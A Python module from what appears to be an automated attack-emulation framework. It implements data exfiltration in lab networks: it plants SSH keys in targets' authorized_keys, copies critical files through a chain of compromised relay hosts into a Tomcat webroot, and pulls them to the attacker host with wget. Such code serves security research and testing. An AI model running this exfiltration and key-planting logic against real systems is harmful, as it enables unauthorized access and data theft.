import os
from incalmo.models.agent import Agent

from incalmo.core.actions.high_level_action import HighLevelAction
from incalmo.core.actions.low_level_action import RESOLVE_HOME
from incalmo.core.actions.LowLevel import (
    MD5SumAttackerData,
    ReadFile,
    AddSSHKey,
    SCPFile,
    wgetFile,
    ListFilesInDirectory,
)
from incalmo.core.models.network import Host
from incalmo.core.models.events import (
    Event,
    ExfiltratedData,
    FileContentsFound,
    FilesFound,
)
from incalmo.core.services import (
    LowLevelActionOrchestrator,
    EnvironmentStateService,
    AttackGraphService,
)
from incalmo.core.services.action_context import HighLevelContext
from config.attacker_config import Environment


class ExfiltrateData(HighLevelAction):
    def __init__(self, target_host: Host):
        super().__init__()
        self.target_host = target_host

    async def run(
        self,
        low_level_action_orchestrator: LowLevelActionOrchestrator,
        environment_state_service: EnvironmentStateService,
        attack_graph_service: AttackGraphService,
        context: HighLevelContext,
    ) -> list[Event]:
        # A caller may target a host that was never discovered/added to the
        # environment state (e.g. a state-machine strategy with a hardcoded IP on
        # an unscanned subnet). Nothing to exfiltrate — return cleanly rather than
        # dereferencing None below.
        if self.target_host is None:
            print("ExfiltrateData: target host is None — skipping.")
            return []
        attack_graph_service.record_action(
            self.target_host, self.target_host, "exfiltrate"
        )
        target_agent = self.target_host.get_agent()
        if len(environment_state_service.initial_hosts) == 0:
            raise Exception("No attacker host found")

        attacker_host = environment_state_service.initial_hosts[0]
        attacker_agent = attacker_host.get_agent()
        if attacker_agent is None:
            raise Exception("No attacker agent found")

        # Skip if ICS environment
        # TODO bigger patch for when to skip data
        if environment_state_service.environment_type == Environment.ICS.value:
            return []

        if len(self.target_host.critical_data_files) == 0:
            return []

        if target_agent is None:
            return []

        webserver_exists = False
        for host in environment_state_service.network.get_all_hosts():
            if host.has_service("http") and len(host.agents) > 0:
                webserver_exists = True
                break

        if webserver_exists:
            # Exfiltrate data over http
            relayed = await self.indirect_http_exfiltrate(
                attacker_agent,
                self.target_host,
                low_level_action_orchestrator,
                environment_state_service,
                attack_graph_service,
                context,
            )
            if relayed:
                # The relay reports only that every command was DISPATCHED: scp and
                # wget emit no success event, so a hop with no route is
                # indistinguishable from one that worked. The md5sum sweep of the
                # attacker's home is the only ground truth available, so confirm the
                # files actually landed before writing off the ssh fallback -- the
                # old unconditional `return True` is what made that fallback dead
                # code and reported a failed exfiltration as a successful one.
                events = await self.record_exfil_results(
                    attacker_agent, low_level_action_orchestrator, context
                )
                if self._exfil_complete(events):
                    return events
            await self.direct_ssh_exfiltrate(
                attacker_agent, low_level_action_orchestrator, context
            )
        else:
            await self.direct_ssh_exfiltrate(
                attacker_agent, low_level_action_orchestrator, context
            )
        # Record results of any exfiltrated data
        return await self.record_exfil_results(
            attacker_agent, low_level_action_orchestrator, context
        )

    async def record_exfil_results(
        self,
        attack_agent: Agent,
        low_level_action_orchestrator: LowLevelActionOrchestrator,
        context: HighLevelContext,
    ):
        events = await low_level_action_orchestrator.run_action(
            MD5SumAttackerData(attack_agent), context
        )
        return events

    def _exfil_complete(self, events: list[Event]) -> bool:
        """Whether every critical file of the target host is now on the attacker."""
        exfiltrated = {
            event.file for event in events if isinstance(event, ExfiltratedData)
        }
        expected = {
            os.path.basename(critical_filepath)
            for critical_filepaths in self.target_host.critical_data_files.values()
            for critical_filepath in critical_filepaths
        }
        return len(expected) > 0 and expected.issubset(exfiltrated)

    async def _get_ssh_public_key(
        self,
        agent: Agent,
        low_level_action_orchestrator: LowLevelActionOrchestrator,
        context: HighLevelContext,
    ) -> str | None:
        # Discover whatever .pub key exists rather than guessing the type
        list_events = await low_level_action_orchestrator.run_action(
            ListFilesInDirectory(agent, f"{RESOLVE_HOME}/.ssh"), context
        )
        pub_files = []
        for event in list_events:
            if isinstance(event, FilesFound):
                pub_files = [f for f in event.files if f.endswith(".pub")]
                break

        for filename in pub_files:
            events = await low_level_action_orchestrator.run_action(
                ReadFile(agent, f"{RESOLVE_HOME}/.ssh/{filename}"), context
            )
            for event in events:
                if (
                    isinstance(event, FileContentsFound)
                    and event.contents
                    and event.contents.startswith("ssh-")
                ):
                    return event.contents
        return None

    async def direct_ssh_exfiltrate(
        self,
        attacker_agent: Agent,
        low_level_action_orchestrator: LowLevelActionOrchestrator,
        context: HighLevelContext,
    ):
        ssh_key_data = await self._get_ssh_public_key(
            attacker_agent, low_level_action_orchestrator, context
        )

        if not ssh_key_data:
            return

        for user, file_paths in self.target_host.critical_data_files.items():
            target_agent = self.target_host.get_agent_by_username(user)
            if target_agent is None:
                continue

            # Add SSH key to target host
            await low_level_action_orchestrator.run_action(
                AddSSHKey(target_agent, ssh_key_data), context
            )

            for critical_filepath in file_paths:
                # Exfiltrate data
                ssh_port = self.target_host.get_port_for_service("ssh")
                ssh_ip = self.target_host.get_ip_address()
                if ssh_ip is None:
                    # Error, unable to exfitlrate data
                    continue
                if ssh_port is None:
                    ssh_port = "22"
                ssh_port = str(ssh_port)

                ssh_user = target_agent.username
                filename = f"{RESOLVE_HOME}/" + os.path.basename(critical_filepath)

                await low_level_action_orchestrator.run_action(
                    SCPFile(
                        attacker_agent,
                        ssh_ip,
                        ssh_user,
                        ssh_port,
                        critical_filepath,
                        filename,
                    ),
                    context,
                )

    def _build_relay_chain(
        self,
        target_host: Host,
        env_state_service: EnvironmentStateService,
        attack_graph_service: AttackGraphService,
    ) -> list[Host] | None:
        """The hosts the data is relayed through, target first and the webserver last.

        Prefers the credential-proven chain, because a webserver is frequently NOT
        adjacent to the data: in enterprise_b the databases sit two subnets behind the
        webservers (webserver -> employeea -> database, with no webserver<->database
        link), so no webserver can scp from a database and the single relay hop this
        used to do has no route at all. Every link of the chain is a utilized
        credential, so each host can pull from the one before it.

        Falls back to the old "any http host with an agent" guess when no such chain
        exists, since a host can be reachable without a credential having been used.
        """
        chain = attack_graph_service.find_exfiltration_path(target_host)

        if chain is None:
            for host in env_state_service.network.get_all_hosts():
                if host.has_service("http") and len(host.agents) > 0:
                    chain = [target_host, host]
                    break

        if chain is None:
            return None

        if len(chain) == 1:
            # The target IS the webserver, but the data still has to be copied into
            # the webroot before it can be served -- relay it to itself.
            chain = [chain[0], chain[0]]

        return chain

    async def indirect_http_exfiltrate(
        self,
        attacker_agent: Agent,
        target_host: Host,
        low_level_action_orchestrator: LowLevelActionOrchestrator,
        env_state_service: EnvironmentStateService,
        attack_graph_service: AttackGraphService,
        context: HighLevelContext,
    ) -> bool:
        relay_chain = self._build_relay_chain(
            target_host, env_state_service, attack_graph_service
        )

        if relay_chain is None:
            raise Exception("No webservers to exfiltrate to")

        webserver_host = relay_chain[-1]

        # Authorize each hop to pull from its predecessor (once per hop, not per file) and
        # relay with the agent whose key that actually installed. The two cannot be chosen
        # separately: add_ssh_key only authorizes an agent that HAS a keypair, while
        # Host.get_agent() picks at random, so a host carrying both (employeea0 runs a root
        # agent with a key and an ubuntu agent without one) would relay as an agent whose key
        # is in no authorized_keys and fail with "Permission denied (publickey)". Fixing the
        # agent per hop is still required: each hop pulls out of the home directory the
        # previous hop actually wrote to.
        relay_agents: list[Agent] = []
        for src_host, dst_host in zip(relay_chain, relay_chain[1:]):
            relay_agent = await self.add_ssh_key(
                dst_host, src_host, low_level_action_orchestrator, context
            )
            if relay_agent is None:
                return False
            relay_agents.append(relay_agent)

        for user, critical_filepaths in self.target_host.critical_data_files.items():
            for critical_filepath in critical_filepaths:
                filename = os.path.basename(critical_filepath)

                # Walk the file along the chain, each hop pulling from its predecessor
                src_filepath = critical_filepath
                src_user = user
                for hop, src_host in enumerate(relay_chain[:-1]):
                    relay_agent = relay_agents[hop]

                    ssh_ip = src_host.get_ip_address()
                    if ssh_ip is None:
                        # Error, unable to exfitlrate data
                        raise Exception("Unknown SSH ip")

                    ssh_port = src_host.get_port_for_service("ssh")
                    if ssh_port is None:
                        ssh_port = 22

                    # Only the last hop stages into the webroot; the rest just park the
                    # file in the relay agent's home to hand on.
                    last_hop = hop == len(relay_agents) - 1
                    await low_level_action_orchestrator.run_action(
                        SCPFile(
                            relay_agent,
                            ssh_ip=ssh_ip,
                            ssh_user=src_user,
                            ssh_port=str(ssh_port),
                            src_filepath=src_filepath,
                            dst_filepath=(
                                f"/opt/tomcat/webapps/ROOT/{filename}"
                                if last_hop
                                else f"{RESOLVE_HOME}/{filename}"
                            ),
                        ),
                        context,
                    )

                    # The next hop pulls what this one staged out of the relay agent's
                    # home. A bare path, because the REMOTE sshd resolves an scp source
                    # against that user's login session (RESOLVE_HOME would wrongly
                    # resolve on the pulling host).
                    src_filepath = filename
                    src_user = relay_agent.username

        # Wget files from webservers
        ssh_host_ip = webserver_host.get_ip_address()
        webserver_port = webserver_host.get_port_for_service("http")

        if ssh_host_ip is None or webserver_port is None:
            return False

        for user, critical_filepaths in self.target_host.critical_data_files.items():
            for critical_filepath in critical_filepaths:
                filename = os.path.basename(critical_filepath)
                await low_level_action_orchestrator.run_action(
                    wgetFile(
                        attacker_agent,
                        url=f"http://{ssh_host_ip}:{webserver_port}/{filename}",
                    ),
                    context,
                )
        return True

    async def add_ssh_key(
        self,
        source_host: Host,
        target_host: Host,
        low_level_action_orchestrator: LowLevelActionOrchestrator,
        context: HighLevelContext,
    ) -> Agent | None:
        """Authorize source_host's agents on target_host; return one that was authorized.

        An agent with no keypair is skipped, so the returned agent is the one a caller must
        ssh/scp as -- any other agent on source_host may hold no key target_host trusts.
        """
        authorized_agent = None
        for src_agent in source_host.agents:
            ssh_key_data = await self._get_ssh_public_key(
                src_agent, low_level_action_orchestrator, context
            )

            if ssh_key_data is None:
                continue

            for target_agent in target_host.agents:
                await low_level_action_orchestrator.run_action(
                    AddSSHKey(target_agent, ssh_key_data), context
                )
            if authorized_agent is None:
                authorized_agent = src_agent
        return authorized_agent
